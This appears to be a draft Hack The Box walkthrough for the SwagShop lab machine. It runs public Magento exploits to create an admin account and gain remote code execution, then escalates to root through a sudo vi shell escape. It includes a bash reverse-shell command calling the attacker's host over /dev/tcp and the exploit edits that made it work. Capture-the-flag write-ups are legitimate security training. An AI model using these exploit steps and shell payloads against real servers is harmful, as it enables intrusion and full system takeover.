@@ -1,0 +1,216 @@
+I"�+<p>DRAFT: Walkthrough for SWAGSHOP - 10.10.10.140</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>first we assign the ip addresses to a local variables:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TARGET</span><span class="o">=</span>10.10.10.140
+<span class="nv">ATTACK</span><span class="o">=</span>10.10.14.34
+</code></pre></div></div>
+
+<p>Then we run the nmap scan</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.140
+Host is up (0.031s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>I visit the website in Firefox to see Magento:</p>
+
+<p><img src="/assets/htb_stuff/swagshop/magento.png" alt="magento.png" /></p>
+
+<blockquote>
+  <p>TODO gobuster the admin panel</p>
+</blockquote>
+
+<h2 id="triage">Triage</h2>
+
+<p>Check the source code to see it is 2014.</p>
+
+<p>chech searsploit</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit magento
+</code></pre></div></div>
+
+<p>There are a few, I look through them:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                               |  Path
+                                                                             | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------- ----------------------------------------
+Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username'] | exploits/php/webapps/32808.txt
+Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php | exploits/php/webapps/32809.txt
+Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                    | exploits/php/webapps/32810.txt
+Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File               | exploits/php/webapps/39838.php
+Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution                 | exploits/php/webapps/37811.py
+Magento Server MAGMI Plugin - Multiple Vulnerabilities                       | exploits/php/webapps/35996.txt
+Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                  | exploits/php/webapps/35052.txt
+Magento eCommerce - Local File Disclosure                                    | exploits/php/webapps/19793.txt
+Magento eCommerce - Remote Code Execution                                    | exploits/xml/webapps/37977.py
+eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                 | exploits/php/webapps/38573.txt
+eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial  | exploits/php/webapps/38651.txt
+----------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre></div></div>
+
+<p>Exploit 37811.py has RCE but needa authentication to work, which I don’t have. On further reading I notice 37977.py creates admin accounts.</p>
+
+<p>This looks promisining as I uses injection to create a ner admin user as it does not require authentication then chain it to get a shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-x</span> 37977
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>I copy it to my working directory</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> 37977
+</code></pre></div></div>
+
+<p>and edit the code as to remove all the non python code and define a target url:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>target = "http://10.10.10.140/index.php" #line 31
+</code></pre></div></div>
+
+<p>I run with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 37977.py 
+</code></pre></div></div>
+
+<p>This appears to work</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WORKED
+Check http://10.10.10.140/index.php/admin with creds forme:forme
+</code></pre></div></div>
+
+<p>so I try to login:</p>
+
+<p><img src="/assets/htb_stuff/swagshop/login.png" alt="login.png" /></p>
+
+<p>But this fails, hmmm what did I do wrong?</p>
+
+<blockquote>
+  <p>TODO gobuster analysis</p>
+</blockquote>
+
+<p>I go to the admin panel at http://10.10.10.140/index.php/admin and try:</p>
+
+<p><img src="/assets/htb_stuff/swagshop/admin.png" alt="admin.png" /></p>
+
+<p>it works!</p>
+
+<p><img src="/assets/htb_stuff/swagshop/accesss.png" alt="accesss.png" /></p>
+
+<p>Now that I have the frome:forem access credentials I look at the the other exploit. I start by copying it to my working directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> 37811
+</code></pre></div></div>
+
+<p>I edit the source code to add the username and password vaues:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">username</span> <span class="o">=</span> <span class="s">'forme'</span> <span class="c1">#line 32
+</span><span class="n">password</span> <span class="o">=</span> <span class="s">'forme'</span> <span class="c1">#line 33
+</span></code></pre></div></div>
+
+<p>form http://10.10.10.140/app/etc/local.xml I get the install date:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;![CDATA[ Wed, 08 May 2019 07:23:09 +0000 ]]&gt;</span>
+</code></pre></div></div>
+
+<p>So I change line 35 to:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">install_date</span> <span class="o">=</span> <span class="s">'Wed, 08 May 2019 07:23:09 +0000'</span>  <span class="c1"># This needs to be the exact date from /app/etc/local.xml
+</span></code></pre></div></div>
+
+<p>when I execute with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 37811.py http://<span class="nv">$TARGET</span>/index.php/admin/ <span class="s2">"uaname -a"</span>
+</code></pre></div></div>
+
+<p>I get back an error:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Traceback (most recent call last):
+  File "37811.py", line 69, in 
+    tunnel = tunnel.group(1)
+AttributeError: 'NoneType' object has no attribute 'group'
+</code></pre></div></div>
+
+<blockquote>
+  <p>So it appeared that the request URL just before line 69 was not entirely correct as it resulted in an empty group. Interestingly, this line contained an Ajax request with the statement of a certain period. After trying this request with several possible options in a python console, it resulted that the option of a period of 1 year was the right setting.</p>
+</blockquote>
+
+<p>I change the tab orders period to 1 yr:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'block/tab_orders/period/1y/?isAjax=true'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'isAjax=false&amp;form_key='</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span> <span class="c1">#line 69
+</span></code></pre></div></div>
+
+<p>and run:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 37811.py http://$TARGET/index.php/admin/ "uname -a"
+</code></pre></div></div>
+
+<p>This time I get no errors, suggesting blind command execution I try a shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 37811.py http://<span class="nv">$TARGET</span>/index.php/admin/ <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.37/1337 0&gt;&amp;1'"</span>
+</code></pre></div></div>
+
+<p>And get RCE:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to [10.10.14.37] from (UNKNOWN) [10.10.10.140] 60276
+bash: cannot set terminal process group (1291): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@swagshop:/var/www/html$ 
+</code></pre></div></div>
+
+<h2 id="priv-escalation">Priv Escalation</h2>
+
+<p>I background the shell with Ctl^Z then in the original terminal forward the settings and restart the backround reverse shell with the following commands:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="nb">fg</span>
+</code></pre></div></div>
+
+<p>This forwards my terminal special keys, next I run</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p>to see my user can run <code class="highlighter-rouge">sudo /usr/bin/vi /var/www/html/*</code> with no password requirements:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for www-data on swagshop:
+                                                                         env_reset, mail_badpass,
+                                                                                                     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+                                                                       User www-data may run the following commands on swagshop:
+              (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+</code></pre></div></div>
+
+<p>This is great as I can call potentially call a priveleged shell in vi:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/vi /var/www/html/pwnd
+</code></pre></div></div>
+
+<pre><code class="language-vi">:! /bin/sh
+</code></pre>
+
+<blockquote>
+  <p>t this point my shell broke, I had to revert. second time I didn’t botehr with the TTY forwarding</p>
+</blockquote>
+
+<p>And I’m root! W00t!W00t!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<h2 id="bonus">Bonus</h2>
+
+<p>TODO Debugging the RCE script and gobuster</p>
+:ET
